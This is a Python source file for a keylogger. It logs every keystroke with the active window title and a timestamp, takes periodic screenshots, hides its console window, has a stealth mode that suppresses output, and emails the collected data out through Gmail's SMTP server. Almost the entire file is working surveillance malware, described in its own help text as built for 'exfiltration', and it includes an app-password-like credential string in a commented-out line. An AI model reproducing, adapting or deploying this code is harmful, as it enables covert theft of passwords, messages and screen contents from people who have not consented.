from pynput.keyboard import Listener, Key
import os
import ctypes
import pandas as pd
import sys
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import argparse
import threading
import pyautogui

# === Command-line Argument Parsing ===
parser = argparse.ArgumentParser(
    description="Keylogger with active window logging, timer, screenshot capture, and formatted HTML email exfiltration."
)
parser.add_argument("--stealth", action="store_true", help="Run in stealth mode (suppress console output).")
parser.add_argument("--timer", type=int, default=0,
                    help="Time in seconds to run the keylogger. 0 means run until Esc is pressed.")
parser.add_argument("--screenshot_interval", type=int, default=0,
                    help="Time in seconds between taking screenshots. 0 means no screenshots will be captured.")
args = parser.parse_args()

# === Obfuscation and Stealth ===
if os.name == "nt":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception as e:
        print(f"Error hiding console window: {e}")
    
    try:
        import win32gui
    except ImportError:
        print("win32gui module is required for active window logging on Windows. Please install the pywin32 package.")

if args.stealth:
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    except Exception as e:
        print(f"Error suppressing console output: {e}")

# === Global Setup ===
LOG_FILE = "keylog.txt"
stop_event = threading.Event()  # Used to stop the screenshot thread

def get_active_window_title():
    """Get the title of the active window using win32gui on Windows."""
    if os.name == "nt":
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except Exception as e:
            return f"Error getting window title: {e}"
    else:
        return "Active window logging not supported on this OS."

# === Keylogger Functionality ===
def on_press(key):
    active_window = get_active_window_title()
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char} | Window: {active_window} | {pd.Timestamp('now')}\n")
    except AttributeError:
        try:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(f"{key} | Window: {active_window} | {pd.Timestamp('now')}\n")
        except Exception as e:
            print(f"Error writing to log file: {e}")

def on_release(key):
    if key == Key.esc:
        return False

# === Screenshot Capture Functionality ===
def capture_screenshot():
    """Capture a screenshot and save it in the 'screenshots' directory with a timestamp."""
    try:
        timestamp = pd.Timestamp('now').strftime("%Y%m%d_%H%M%S")
        screenshot = pyautogui.screenshot()
        screenshot_dir = "screenshots"
        if not os.path.exists(screenshot_dir):
            os.makedirs(screenshot_dir)
        filename = os.path.join(screenshot_dir, f"screenshot_{timestamp}.png")
        screenshot.save(filename)
    except Exception as e:
        print(f"Error capturing screenshot: {e}")

def screenshot_thread_func(interval):
    """Thread function to capture screenshots periodically."""
    while not stop_event.is_set():
        capture_screenshot()
        if stop_event.wait(interval):
            break

# === Data Exfiltration with Formatted HTML Email ===
def send_log_to_email():
    """Send the keylog data and screenshots in a well-formatted HTML email."""
    try:
        # Setup SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        # Use an App Password if 2FA is enabled; replace with valid credentials
        #server.login('yourserver@gmail.com', 'cabc yzkj uemu kekw')
        
        # Create the root message
        msg = MIMEMultipart('related')
        #msg['From'] = 'yoursender@gmail.com'
        #msg['To'] = 'yourreciver@gmail.com'
        msg['Subject'] = 'Formatted Keylog Data and Screenshots'
        
        # Create the alternative part for HTML and plain text
        msg_alternative = MIMEMultipart('alternative')
        msg.attach(msg_alternative)
        
        # Plain text fallback
        plain_text = "Keylogger Data attached in HTML format. Please view this email in HTML mode."
        msg_alternative.attach(MIMEText(plain_text, 'plain'))
        
        # Read and parse log file to build HTML table rows
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'r') as file:
                log_lines = file.readlines()
        else:
            log_lines = ["No keylog data available."]
        
        table_rows = ""
        for line in log_lines:
            # Expected format: "keystroke | Window: active_window | timestamp"
            parts = line.split(" | ")
            if len(parts) >= 3:
                keystroke = parts[0].strip()
                window = parts[1].replace("Window:", "").strip()
                timestamp = parts[2].strip()
                table_rows += f"<tr><td>{keystroke}</td><td>{window}</td><td>{timestamp}</td></tr>"
            else:
                table_rows += f"<tr><td colspan='3'>{line.strip()}</td></tr>"
        
        # Build the HTML body with a styled table
        html_body = f"""
        <html>
        <head>
          <style>
            table {{
              border-collapse: collapse;
              width: 100%;
            }}
            th, td {{
              border: 1px solid #ddd;
              padding: 8px;
            }}
            th {{
              background-color: #f2f2f2;
            }}
          </style>
        </head>
        <body>
          <h2>Keylogger Data</h2>
          <table>
            <tr>
              <th>Keystroke</th>
              <th>Active Window</th>
              <th>Timestamp</th>
            </tr>
            {table_rows}
          </table>
          <h2>Screenshots</h2>
        """
        # Embed screenshots inline
        screenshot_dir = "screenshots"
        if os.path.exists(screenshot_dir):
            screenshot_files = [f for f in os.listdir(screenshot_dir) if f.endswith('.png')]
            for idx, filename in enumerate(screenshot_files):
                cid = f"screenshot{idx}"
                html_body += f'<p><strong>{filename}</strong><br><img src="cid:{cid}" alt="{filename}" style="max-width:600px;"></p>'
        else:
            html_body += "<p>No screenshots available.</p>"
        
        html_body += "</body></html>"
        
        # Attach the HTML body to the email
        msg_alternative.attach(MIMEText(html_body, 'html'))
        
        # Attach screenshots as inline images with Content-ID for HTML reference
        if os.path.exists(screenshot_dir):
            for idx, filename in enumerate(os.listdir(screenshot_dir)):
                if filename.endswith('.png'):
                    filepath = os.path.join(screenshot_dir, filename)
                    try:
                        with open(filepath, 'rb') as img_file:
                            img_data = img_file.read()
                        image = MIMEImage(img_data)
                        image.add_header('Content-ID', f'<screenshot{idx}>')
                        image.add_header('Content-Disposition', 'inline', filename=filename)
                        msg.attach(image)
                    except Exception as e:
                        print(f"Error attaching screenshot {filename}: {e}")
        
        # Send the email
        server.send_message(msg)
        server.quit()
        print("Formatted keylog data and screenshots sent successfully via email.")
    except Exception as e:
        print(f"Error sending log data: {e}")

# === Main Execution ===
if __name__ == "__main__":
    listener = Listener(on_press=on_press, on_release=on_release)
    
    # Start screenshot capturing thread if interval is set
    if args.screenshot_interval > 0:
        screenshot_thread = threading.Thread(target=screenshot_thread_func, args=(args.screenshot_interval,))
        screenshot_thread.daemon = True
        screenshot_thread.start()
    
    # Set a timer if specified
    if args.timer > 0:
        timer = threading.Timer(args.timer, listener.stop)
        timer.start()
    
    try:
        listener.start()
        listener.join()
    except Exception as e:
        print(f"Error starting keylogger: {e}")
    
    # Signal the screenshot thread to stop
    stop_event.set()
    
    try:
        send_log_to_email()
    except Exception as e:
        print(f"Error in main execution: {e}")
